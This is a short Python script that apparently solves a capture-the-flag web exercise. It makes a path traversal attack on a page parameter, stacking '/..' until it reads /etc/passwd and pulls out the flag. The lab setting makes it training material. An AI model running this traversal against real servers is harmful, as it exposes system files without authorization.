import os
import requests
import re

ip = os.getenv('darkly_ip')
baseurl = f'http://{ip}/index.php?page='

def try_path(path):
    url = baseurl + path + '/etc/passwd'
    print('Trying', url)
    r = requests.get(url)
    m = re.findall('The flag is : ([a-z0-9]+) ', r.text)
    if m:
        return m[0]


if __name__ == '__main__':
    flag = None
    original_path = path = '/..'
    while not flag:
        flag = try_path(path)
        path += original_path
    print('\nFound', flag)